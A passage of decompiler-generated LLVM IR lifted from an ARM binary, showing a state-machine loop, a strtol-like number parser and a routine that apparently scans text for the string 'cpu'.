  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 126992, i32* @r5, align 4
  %v4_13034 = load i32, i32* inttoptr (i32 127008 to i32*), align 32
  store i32 77888, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13034)
  %v2_13050 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_1305c = call i32 @function_112d4(i32 1, i32 %v2_13050, i32 0)
  %v4_13064 = load i32, i32* @global_var_1f2a8.398, align 4
  %v2_13068 = icmp eq i32 %v4_13064, 0
  br i1 %v2_13068, label %dec_label_pc_13070, label %dec_label_pc_130b0

dec_label_pc_13070:                               ; preds = %dec_label_pc_1301c
  store i32 1, i32* @global_var_1f2a8.398, align 4
  br label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %dec_label_pc_130c0, %dec_label_pc_13070
  %v0_1307c = load i32, i32* @r5, align 4
  %v2_1307c = add i32 %v0_1307c, 160
  store i32 %v2_1307c, i32* @r4, align 4
  %v2_13088 = add i32 %v0_1307c, 36
  %v3_13088 = inttoptr i32 %v2_13088 to i32*
  %v4_13088 = load i32, i32* %v3_13088, align 4
  call void @__pseudo_branch(i32 %v4_13088)
  %v1_13098 = call i32 @function_11b24(i32 6)
  %v0_130a4 = load i32, i32* @r5, align 4
  %v2_130a4 = add i32 %v0_130a4, 16
  %v3_130a4 = inttoptr i32 %v2_130a4 to i32*
  %v4_130a4 = load i32, i32* %v3_130a4, align 4
  store i32 78000, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_130a4)
  %v4_130b4.pre = load i32, i32* @global_var_1f2a8.398, align 4
  br label %dec_label_pc_130b0

dec_label_pc_130b0:                               ; preds = %dec_label_pc_1301c, %dec_label_pc_13078
  %v0_130c4 = phi i32 [ %v4_13064, %dec_label_pc_1301c ], [ %v4_130b4.pre, %dec_label_pc_13078 ]
  %v7_130b8 = icmp eq i32 %v0_130c4, 1
  br i1 %v7_130b8, label %dec_label_pc_130c0, label %dec_label_pc_130fc

dec_label_pc_130c0:                               ; preds = %dec_label_pc_130b0
  %v2_130c0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_130c0, i32* @r4, align 4
  store i32 2, i32* @global_var_1f2a8.398, align 4
  store i32 20, i32* @r2, align 4
  %v2_130d8 = bitcast i32* %stack_var_-28 to i8*
  %v3_130d8 = call i32 @function_11790(i8* %v2_130d8, i32 0)
  %v3_130f4 = call i32 @function_14084(i32 6, i32 %v2_130c0, i32 0)
  br label %dec_label_pc_13078

dec_label_pc_130fc:                               ; preds = %dec_label_pc_130b0
  %v7_130fc = icmp eq i32 %v0_130c4, 2
  br i1 %v7_130fc, label %dec_label_pc_13104, label %dec_label_pc_13110

dec_label_pc_13104:                               ; preds = %dec_label_pc_130fc
  store i32 3, i32* @global_var_1f2a8.398, align 4
  %v0_1310c = call i32 @function_1301c()
  %v4_13110.pre = load i32, i32* @global_var_1f2a8.398, align 4
  br label %dec_label_pc_13110

dec_label_pc_13110:                               ; preds = %dec_label_pc_130fc, %dec_label_pc_13104
  %v1_13118 = phi i32 [ %v0_130c4, %dec_label_pc_130fc ], [ %v4_13110.pre, %dec_label_pc_13104 ]
  %v7_13114 = icmp eq i32 %v1_13118, 3
  br i1 %v7_13114, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13110
  store i32 4, i32* @global_var_1f2a8.398, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13110, %bb
  call void @__pseudo_cond_branch(i1 %v7_13114, i32 ptrtoint (i32* @global_var_14674.400 to i32))
  br label %dec_label_pc_13128

dec_label_pc_13128:                               ; preds = %dec_label_pc_13128, %.thread1
  %v0_13128 = call i32 @function_1301c()
  br label %dec_label_pc_13128

; uselistorder directives
  uselistorder i32 ()* @function_1301c, { 1, 0, 5, 4, 6, 3, 2 }
  uselistorder i32 6, { 14, 15, 75, 3, 31, 32, 16, 27, 17, 28, 18, 29, 19, 30, 1, 33, 20, 34, 0, 4, 35, 36, 21, 37, 5, 38, 39, 40, 22, 41, 6, 42, 43, 44, 23, 45, 46, 47, 24, 48, 49, 50, 51, 7, 52, 53, 54, 55, 8, 56, 57, 58, 59, 60, 25, 61, 9, 62, 63, 64, 65, 66, 67, 26, 68, 10, 69, 70, 71, 72, 11, 73, 12, 13, 2, 74 }
  uselistorder i32* @global_var_1f2a8.398, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 127008 to i32*), { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_13110, { 1, 0 }
  uselistorder label %dec_label_pc_130b0, { 1, 0 }
}

define i32 @function_13134(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13134:
  %v0_13134 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13134, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13134
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13134, %bb
  %v4_13140 = phi i32 [ %arg1, %dec_label_pc_13134 ], [ 0, %bb ]
  ret i32 %v4_13140

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_13144(i32 %arg1) local_unnamed_addr {
dec_label_pc_13144:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13154 = call i32 @function_13164()
  ret i32 %v0_13154
}

define i32 @function_13164() local_unnamed_addr {
dec_label_pc_13164:
  store i32 1, i32* @r3, align 4
  %v0_13170 = call i32 @function_13180()
  ret i32 %v0_13170
}

define i32 @function_13180() local_unnamed_addr {
dec_label_pc_13180:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_13180 = load i32, i32* @r4, align 4
  %v12_13180 = load i32, i32* @r7, align 4
  store i32 224, i32* @lr, align 4
  store i32 126992, i32* %ip.global-to-local, align 4
  %v0_13194 = load i32, i32* @r1, align 4
  store i32 %v0_13194, i32* %fp.global-to-local, align 4
  %v0_13198 = load i32, i32* @r2, align 4
  store i32 %v0_13198, i32* %r5.global-to-local, align 4
  %v0_1319c = load i32, i32* @r0, align 4
  store i32 %v0_1319c, i32* @r4, align 4
  %v0_131a0 = load i32, i32* @r3, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131a8:                               ; preds = %dec_label_pc_131ac
  %v1_131a8 = add i32 %v0_131e4, 1
  store i32 %v1_131a8, i32* @r4, align 4
  br label %dec_label_pc_131ac

dec_label_pc_131ac:                               ; preds = %dec_label_pc_13180, %dec_label_pc_131a8
  %v0_131e4 = phi i32 [ %v0_1319c, %dec_label_pc_13180 ], [ %v1_131a8, %dec_label_pc_131a8 ]
  %v1_131ac = inttoptr i32 %v0_131e4 to i8*
  %v2_131ac = load i8, i8* %v1_131ac, align 1
  %v3_131ac = zext i8 %v2_131ac to i32
  %v4_131b0 = load i32, i32* inttoptr (i32 127216 to i32*), align 16
  %v2_131b4 = mul nuw nsw i32 %v3_131ac, 2
  %v2_131b8 = add i32 %v2_131b4, %v4_131b0
  %v3_131b8 = inttoptr i32 %v2_131b8 to i16*
  %v4_131b8 = load i16, i16* %v3_131b8, align 2
  %v1_131bc = and i16 %v4_131b8, 32
  %v2_131bc = icmp eq i16 %v1_131bc, 0
  br i1 %v2_131bc, label %dec_label_pc_131c4, label %dec_label_pc_131a8

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131ac
  %v7_131c4 = icmp eq i8 %v2_131ac, 43
  br i1 %v7_131c4, label %dec_label_pc_131e4, label %dec_label_pc_131cc

dec_label_pc_131cc:                               ; preds = %dec_label_pc_131c4
  %v7_131cc = icmp eq i8 %v2_131ac, 45
  br i1 %v7_131cc, label %dec_label_pc_131e4, label %bb

bb:                                               ; preds = %dec_label_pc_131cc
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_131e8

dec_label_pc_131e4:                               ; preds = %dec_label_pc_131c4, %dec_label_pc_131cc
  %storemerge39 = phi i32 [ 1, %dec_label_pc_131cc ], [ 0, %dec_label_pc_131c4 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_131e4 = add i32 %v0_131e4, 1
  store i32 %v1_131e4, i32* @r4, align 4
  br label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %bb, %dec_label_pc_131e4
  %v0_13208 = phi i32 [ %v0_131e4, %bb ], [ %v1_131e4, %dec_label_pc_131e4 ]
  %v1_131e8 = and i32 %v0_13198, -17
  %v3_131e8 = icmp eq i32 %v1_131e8, 0
  br i1 %v3_131e8, label %dec_label_pc_131f4, label %bb52

bb52:                                             ; preds = %dec_label_pc_131e8
  store i32 %v0_1319c, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_131f4:                               ; preds = %dec_label_pc_131e8
  %v1_131f4 = inttoptr i32 %v0_13208 to i8*
  %v2_131f4 = load i8, i8* %v1_131f4, align 1
  %v7_131f8 = icmp eq i8 %v2_131f4, 48
  %v1_131fc = add i32 %v0_13198, 10
  store i32 %v1_131fc, i32* %r5.global-to-local, align 4
  br i1 %v7_131f8, label %dec_label_pc_13208, label %bb53

bb53:                                             ; preds = %dec_label_pc_131f4
  store i32 %v0_1319c, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_13208:                               ; preds = %dec_label_pc_131f4
  %v1_13208 = add i32 %v0_13208, 1
  %v2_13208 = inttoptr i32 %v1_13208 to i8*
  %v3_13208 = load i8, i8* %v2_13208, align 1
  %v4_13208 = zext i8 %v3_13208 to i32
  store i32 %v1_13208, i32* @r4, align 4
  %v1_1320c = or i32 %v4_13208, 32
  %v7_13210 = icmp eq i32 %v1_1320c, 120
  %v1_13214 = add i32 %v0_13198, 8
  store i32 %v1_13214, i32* %r5.global-to-local, align 4
  store i32 %v1_13208, i32* %r6.global-to-local, align 4
  br i1 %v7_13210, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_13208
  %v3_13220 = mul i32 %v1_13214, 2
  store i32 %v3_13220, i32* %r5.global-to-local, align 4
  %v2_13224 = add i32 %v0_13208, 2
  store i32 %v2_13224, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13208, %bb53, %bb54
  %v0_13228 = phi i32 [ %v1_131fc, %bb53 ], [ %v3_13220, %bb54 ], [ %v1_13214, %dec_label_pc_13208 ]
  %v5_1322c = icmp slt i32 %v0_13228, 16
  br i1 %v5_1322c, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_13244 = phi i32 [ %v0_13198, %bb52 ], [ %v0_13228, %.thread8 ], [ 16, %bb55 ]
  %v1_13230 = add i32 %v0_13244, -2
  %tmp = icmp ugt i32 %v1_13230, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13240

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_132ec

dec_label_pc_13240:                               ; preds = %bb56
  %v2_13248 = call i32 @function_10ea4(i32 -1, i32 %v0_13244)
  store i32 -1, i32* @r0, align 4
  %v0_13254 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13254, i32* @r1, align 4
  %v1_13258 = urem i32 %v0_13244, 256
  store i32 %v1_13258, i32* %sl.global-to-local, align 4
  %v0_1325c = call i32 @function_10da8()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_1325c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_13274.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13274

dec_label_pc_13270:                               ; preds = %bb63, %dec_label_pc_132d0
  %v0_13270 = phi i32 [ %v1_132b036, %bb63 ], [ %v0_13270.pre, %dec_label_pc_132d0 ]
  store i32 %v0_13270, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13274

dec_label_pc_13274:                               ; preds = %dec_label_pc_13240, %dec_label_pc_13270
  %v0_132b0 = phi i32 [ %v0_13274.pre, %dec_label_pc_13240 ], [ %v0_13270, %dec_label_pc_13270 ]
  %v1_13274 = inttoptr i32 %v0_132b0 to i8*
  %v2_13274 = load i8, i8* %v1_13274, align 1
  %v3_13274 = zext i8 %v2_13274 to i32
  %v1_13278 = add nsw i32 %v3_13274, -48
  %v1_1327c = urem i32 %v1_13278, 256
  %v1_13284 = or i32 %v3_13274, 32
  %tmp71 = icmp ult i32 %v1_1327c, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13274
  %tmp72 = icmp ugt i32 %v1_13284, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_1328c
  %v1_13290 = add nsw i32 %v1_13284, -87
  %v5_13298 = urem i32 %v1_13290, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_13274, %dec_label_pc_1328c, %bb57
  %v3_132c8 = phi i32 [ %v1_1327c, %dec_label_pc_13274 ], [ 40, %dec_label_pc_1328c ], [ %v5_13298, %bb57 ]
  %v1_1329c = load i32, i32* %r5.global-to-local, align 4
  %v6_132a0 = icmp slt i32 %v3_132c8, %v1_1329c
  br i1 %v6_132a0, label %dec_label_pc_132a4, label %dec_label_pc_132ec.loopexit

dec_label_pc_132a4:                               ; preds = %bb58
  %v0_132a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_132a4 = load i32, i32* %r8.global-to-local, align 4
  %v9_132a4 = icmp eq i32 %v0_132a4, %v1_132a4
  br i1 %v9_132a4, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_132a4
  %v1_132b032 = add i32 %v0_132b0, 1
  store i32 %v1_132b032, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_132b8

bb59:                                             ; preds = %dec_label_pc_132a4
  %v3_132a4 = icmp ult i32 %v0_132a4, %v1_132a4
  %v1_132b0 = add i32 %v0_132b0, 1
  store i32 %v1_132b0, i32* %r4.global-to-local, align 4
  br i1 %v3_132a4, label %dec_label_pc_132b8, label %dec_label_pc_132d0

dec_label_pc_132b8:                               ; preds = %bb59, %.thread31
  %v1_132b036 = phi i32 [ %v1_132b032, %.thread31 ], [ %v1_132b0, %bb59 ]
  %v4_132c02235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_132b8 = load i32, i32* %sl.global-to-local, align 4
  %v3_132b8 = icmp uge i32 %v3_132c8, %v1_132b8
  %v9_132b8 = icmp eq i32 %v3_132c8, %v1_132b8
  %v2_132bc = xor i1 %v3_132b8, true
  %v3_132bc = or i1 %v9_132b8, %v2_132bc
  br i1 %v3_132bc, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_132b8
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_132b8, %bb60
  %v4_132c0 = phi i32 [ %v4_132c02235, %dec_label_pc_132b8 ], [ 0, %bb60 ]
  %v2_132c0 = xor i1 %v9_132b8, true
  %v3_132c0 = and i1 %v3_132b8, %v2_132c0
  br i1 %v3_132c0, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_132c0 = urem i32 %v4_132c0, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_132c4 = phi i32 [ %v5_132c0, %bb62 ], [ %v4_132c0, %bb61 ]
  %v2_132c4 = icmp eq i32 %v0_132c4, 0
  br i1 %v2_132c4, label %bb63, label %dec_label_pc_132d0

bb63:                                             ; preds = %thread-pre-split
  %v4_132c8 = mul i32 %v0_132a4, %v1_1329c
  %v5_132c8 = add i32 %v4_132c8, %v3_132c8
  store i32 %v5_132c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13270

dec_label_pc_132d0:                               ; preds = %bb59, %thread-pre-split
  %v0_132d0 = call i32 @function_11734()
  %v0_132d8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_132d8, i32* %ip.global-to-local, align 4
  %v0_132dc = load i32, i32* @r7, align 4
  %v2_132dc = and i32 %v0_132dc, %v0_131a0
  store i32 %v2_132dc, i32* @r7, align 4
  %v2_132e4 = inttoptr i32 %v0_132d0 to i32*
  store i32 34, i32* %v2_132e4, align 4
  %v0_13270.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13270

dec_label_pc_132ec.loopexit:                      ; preds = %bb58
  %v0_132ec.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_132ec

dec_label_pc_132ec:                               ; preds = %.thread, %dec_label_pc_132ec.loopexit
  %v2_132f0 = phi i32 [ %v0_132ec.pre, %dec_label_pc_132ec.loopexit ], [ %v0_13194, %.thread ]
  %v2_132ec = icmp eq i32 %v2_132f0, 0
  br i1 %v2_132ec, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_132ec
  %v1_132f0 = load i32, i32* %r6.global-to-local, align 4
  %v3_132f0 = inttoptr i32 %v2_132f0 to i32*
  store i32 %v1_132f0, i32* %v3_132f0, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_132ec, %bb64
  %v0_132f8 = load i32, i32* @r7, align 4
  %v2_132f8 = icmp eq i32 %v0_132f8, 0
  %. = select i1 %v2_132f8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_13304 = icmp eq i32 %v0_131a0, 0
  %v0_13328.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13304, label %dec_label_pc_13320, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_13328.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_13310, label %dec_label_pc_13320

dec_label_pc_13310:                               ; preds = %bb68
  %v0_13310 = call i32 @function_11734()
  %v2_13318 = inttoptr i32 %v0_13310 to i32*
  store i32 34, i32* %v2_13318, align 4
  %v0_1331c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1331c, i32* %ip.global-to-local, align 4
  %v0_13320.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13320

dec_label_pc_13320:                               ; preds = %bb68, %bb65, %dec_label_pc_13310
  %v0_13328.pre = phi i32 [ %v0_13328.pre.pre, %bb68 ], [ %v0_1331c, %dec_label_pc_13310 ], [ %v0_13328.pre.pre, %bb65 ]
  %v0_13320 = phi i32 [ %v0_132f8, %bb68 ], [ %v0_13320.pre, %dec_label_pc_13310 ], [ %v0_132f8, %bb65 ]
  %v2_13320 = icmp eq i32 %v0_13320, 0
  br i1 %v2_13320, label %dec_label_pc_13320._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_13320
  %v2_13324 = sub i32 0, %v0_13328.pre
  store i32 %v2_13324, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13320._crit_edge

dec_label_pc_13320._crit_edge:                    ; preds = %dec_label_pc_13320, %bb69
  %v0_13328 = phi i32 [ %v2_13324, %bb69 ], [ %v0_13328.pre, %dec_label_pc_13320 ]
  store i32 %v3_13180, i32* @r4, align 4
  store i32 %v12_13180, i32* @r7, align 4
  ret i32 %v0_13328

; uselistorder directives
  uselistorder i32 %v0_13328.pre, { 1, 0 }
  uselistorder i32 %v0_13328.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_132c0, { 1, 0 }
  uselistorder i1 %v3_132b8, { 1, 0 }
  uselistorder i32 %v1_132b8, { 1, 0 }
  uselistorder i32 %v1_13284, { 1, 0 }
  uselistorder i32 %v1_1327c, { 1, 0 }
  uselistorder i32 %v0_132b0, { 1, 0, 2 }
  uselistorder i32 %v0_13270, { 1, 0 }
  uselistorder i32 %v3_13220, { 1, 0 }
  uselistorder i32 %v1_13214, { 1, 0, 2 }
  uselistorder i32 %v0_131e4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_131a0, { 1, 0 }
  uselistorder i32 %v0_13198, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 ()* @function_10da8, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 (i32, i32)* @function_10ea4, { 3, 2, 0, 8, 7, 1, 6, 5, 4 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13320._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13320, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_132ec, { 1, 0 }
  uselistorder label %dec_label_pc_132d0, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13274, { 1, 0 }
  uselistorder label %dec_label_pc_13270, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_131e8, { 1, 0 }
  uselistorder label %dec_label_pc_131e4, { 1, 0 }
  uselistorder label %dec_label_pc_131ac, { 1, 0 }
}

define i32 @function_13340(i32 %arg1) local_unnamed_addr {
dec_label_pc_13340:
  %stack_var_-16 = alloca i32, align 4
  store i32 126992, i32* @r5, align 4
  %v4_1334c = load i32, i32* inttoptr (i32 127080 to i32*), align 8
  store i32 %v4_1334c, i32* @r4, align 4
  %v2_13354 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_1336c = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_1336c)
  %v0_13380 = load i32, i32* @r5, align 4
  %v2_13380 = add i32 %v0_13380, 16
  %v3_13380 = inttoptr i32 %v2_13380 to i32*
  %v4_13380 = load i32, i32* %v3_13380, align 4
  call void @__pseudo_branch(i32 %v4_13380)
  %v4_13390 = load i32, i32* @global_var_1f2ac.409, align 4
  %v2_13394 = icmp eq i32 %v4_13390, 0
  br i1 %v2_13394, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13340
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13340, %bb
  %v2_133a0 = xor i1 %v2_13394, true
  call void @__pseudo_cond_branch(i1 %v2_133a0, i32 %v4_13390)
  store i32 %v2_13354, i32* @r0, align 4
  %v0_133b0 = load i32, i32* @r5, align 4
  %v2_133b0 = add i32 %v0_133b0, 24
  %v3_133b0 = inttoptr i32 %v2_133b0 to i32*
  %v4_133b0 = load i32, i32* %v3_133b0, align 4
  call void @__pseudo_branch(i32 %v4_133b0)
  %v0_133bc = call i32 @function_13c0c()
  %v0_133c4 = load i32, i32* @r5, align 4
  %v9_133c4 = icmp eq i32 %v0_133c4, 40808
  br i1 %v9_133c4, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_133cc = xor i1 %v9_133c4, true
  call void @__pseudo_cond_branch(i1 %v2_133cc, i32 ptrtoint (i32* @global_var_150a8.412 to i32))
  %v0_133d0 = load i32, i32* @r6, align 4
  %v1_133d4 = call i32 @function_14674(i32 %v0_133d0)
  %v0_133d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_133d8, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v5_133d8 = sdiv i32 %v1_133d4, 33554432
  %v6_133d8 = and i32 %v5_133d8, %v1_133d4
  store i32 %v6_133d8, i32* @fp, align 4
  %v2_133dc = load i32, i32* @r8, align 4
  %v2_133ec = load i32, i32* @r2, align 4
  %v3_133ec = mul i32 %v2_133ec, %v4_133b0
  %v8_133f0 = shl i32 %v2_133dc, %v3_133ec
  %v9_133f0 = and i32 %v8_133f0, %v3_133ec
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_133f0 = phi i32 [ %v1_133d4, %bb9 ], [ %v9_133f0, %bb10 ]
  ret i32 %v10_133f0

; uselistorder directives
  uselistorder i32 %v1_133d4, { 2, 1, 0 }
  uselistorder i1 %v9_133c4, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_133f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_133f8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_133f8 = load i32, i32* @r4, align 4
  %v6_133f8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_133fc = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_133fc, label %dec_label_pc_13490, label %dec_label_pc_1340c

dec_label_pc_1340c:                               ; preds = %dec_label_pc_133f8
  %v2_1341c = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_13430 = call i32 @function_14084(i32 17, i32 0, i32 %v2_1341c)
  %v3_13434 = load i32, i32* %stack_var_-44, align 4
  %v7_13438 = icmp eq i32 %v3_13434, 1
  br i1 %v7_13438, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1340c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1340c, %bb
  call void @__pseudo_cond_branch(i1 %v7_13438, i32 ptrtoint (i32* @global_var_112d4.414 to i32))
  %v2_1344c = ptrtoint i32* %stack_var_-16 to i32
  %v2_13454 = call i32 @function_145b8(i32 %v2_1344c, i32 %v2_1344c)
  %v2_13458 = icmp eq i32 %v2_13454, 0
  br i1 %v2_13458, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_1346c = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_1346c, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_1347c = load i32, i32* %stack_var_-24, align 4
  %v1_13480 = and i32 %v3_1347c, 65536
  %v2_13480 = icmp eq i32 %v1_13480, 0
  br i1 %v2_13480, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_13480, i32 ptrtoint (i32* @global_var_112d4.414 to i32))
  %v0_13490.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13490

dec_label_pc_13490:                               ; preds = %dec_label_pc_133f8, %.thread6
  %v0_13490 = phi i32 [ %v0_13490.pre, %.thread6 ], [ 0, %dec_label_pc_133f8 ]
  store i32 %v3_133f8, i32* @r4, align 4
  store i32 %v6_133f8, i32* @lr, align 4
  ret i32 %v0_13490

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_14084, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13490, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_134a4() local_unnamed_addr {
dec_label_pc_134a4:
  %stack_var_-36 = alloca i32, align 4
  store i32 126992, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_16908.418 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_134c4 = call i32 @function_14ae8(i32 ptrtoint ([11 x i8]* @global_var_16908.418 to i32))
  store i32 %v2_134c4, i32* @r6, align 4
  %v2_134c8 = icmp eq i32 %v2_134c4, 0
  br i1 %v2_134c8, label %dec_label_pc_13548, label %dec_label_pc_134d0

dec_label_pc_134d0:                               ; preds = %dec_label_pc_134a4
  store i32 224, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_16914.421 to i32), i32* @r8, align 4
  %v2_134dc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_134dc, i32* @r7, align 4
  br label %bb18

dec_label_pc_134e4:                               ; preds = %bb18
  %v3_134e4 = load i32, i32* %stack_var_-36, align 4
  %v1_134e8 = inttoptr i32 %v3_134e4 to i32*
  %v2_134e8 = load i32, i32* %v1_134e8, align 4
  %v1_134ec = inttoptr i32 %v2_134e8 to i8*
  %v2_134ec = load i8, i8* %v1_134ec, align 1
  %v7_134f0 = icmp eq i8 %v2_134ec, 99
  br i1 %v7_134f0, label %dec_label_pc_134f8, label %.backedge3

dec_label_pc_134f8:                               ; preds = %dec_label_pc_134e4
  %v1_134f8 = add i32 %v2_134e8, 1
  %v2_134f8 = inttoptr i32 %v1_134f8 to i8*
  %v3_134f8 = load i8, i8* %v2_134f8, align 1
  %v7_134fc = icmp eq i8 %v3_134f8, 112
  br i1 %v7_134fc, label %dec_label_pc_13504, label %.backedge3

dec_label_pc_13504:                               ; preds = %dec_label_pc_134f8
  %v1_13504 = add i32 %v2_134e8, 2
  %v2_13504 = inttoptr i32 %v1_13504 to i8*
  %v3_13504 = load i8, i8* %v2_13504, align 1
  %v7_13508 = icmp eq i8 %v3_13504, 117
